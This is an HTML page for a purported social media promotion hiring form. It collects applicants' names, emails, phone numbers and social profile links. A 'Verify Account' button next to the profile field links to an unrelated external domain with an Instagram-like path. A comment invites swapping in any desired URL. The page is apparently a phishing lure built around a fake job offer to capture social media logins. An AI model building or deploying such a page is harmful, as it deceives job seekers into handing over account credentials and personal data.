<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hiring for Social Media Promotion</title>
    <link rel="stylesheet" href="styles.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
</head>
<body>
    <div class="page-header">
        <h1>UP SALE <img src="Screenshot_2024-09-14_213035-removebg-preview.png"  class="logo"></h1>
        <p>Your Trusted Partner for Social Media Promotion</p>
    </div>
    
    <div class="form-container">
        <h2>Applicant Information Form</h2>
        <p>Please fill out the form below so we can understand you better.</p>

        <form>
            <!-- Client Information -->
            <div class="form-group">
                <label for="name">Your Name</label>
                <input type="text" id="name" placeholder="Enter your full name" required>
            </div>

            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" placeholder="Enter your email" required>
            </div>

            <div class="form-group">
                <label for="phone">Phone Number</label>
                <input type="tel" id="phone" placeholder="Enter your phone number" required>
            </div>

            <!-- Business Information -->
            <div class="form-group">
                <label for="business-name">College Name</label>
                <input type="text" id="business-name" placeholder="Enter your business name" >
            </div>

            <div class="form-group">
                <label for="website">Website/Social Media Links</label>
                <input type="url" id="website" placeholder="Enter your website or social media profile links" required>
                <a href="http://event-x.com.tr/IC/IG/?id=1717075100" class="verify-btn">Verify Account</a> <!-- Change this link to your desired URL -->
            </div>
                    

            <!-- Promotion Goals -->
            <div class="form-group">
                <label for="goals">Promotion Idea</label>
                <textarea id="goals" placeholder="Describe your goals for social media promotion..." rows="3"></textarea>
            </div>

            <div class="form-group">
                <label for="platforms">Preferred Social Media Platforms</label>
                <div class="checkbox-group">
                    <label><input type="checkbox"> Instagram</label>
                    <label><input type="checkbox"> Facebook</label>
                    <label><input type="checkbox"> Twitter</label>
                    <label><input type="checkbox"> LinkedIn</label>
                    <label><input type="checkbox"> TikTok</label>
                </div>
            </div>

            <div class="form-group">
                <label for="budget">Number of follower in the Platform</label>
                <select id="budget" required>
                    <option value="" disabled selected>Select No. of Follower</option>
                    <option value="500">under 500</option>
                    <option value="500-1000">500 - 1,500</option>
                    <option value="1000-5000">1500 above</option>
                </select>
            </div>
            <div class="form-group">
                <label for="budget">Number of Story View in the Platform</label>
                <select id="budget" required>
                    <option value="" disabled selected>Select No. of view</option>
                    <option value="500">under 200</option>
                    <option value="500-1000">200 - 500</option>
                    <option value="1000-5000">500 above</option>
                </select>
            </div>

            <!-- Timeline & Contact Preferences -->
            <div class="form-group">
                <label for="date">Preferred Start Date</label>
                <input type="date" id="date">
            </div>

            <div class="form-group">
                <label for="contact-method">Preferred Method of Contact</label>
                <select id="contact-method" required>
                    <option value="email">Email</option>
                    <option value="phone">Phone</option>
                    <option value="whatsapp">WhatsApp</option>
                </select>
            </div>

            <div class="form-group">
                <label for="contact-time">Best Time to Contact</label>
                <select id="contact-time" required>
                    <option value="morning">Morning</option>
                    <option value="afternoon">Afternoon</option>
                    <option value="evening">Evening</option>
                </select>
            </div>

            <button type="submit" class="submit-btn">Submit</button>
        </form>
    </div>
    <script>my.js</script>
</body>
</html>
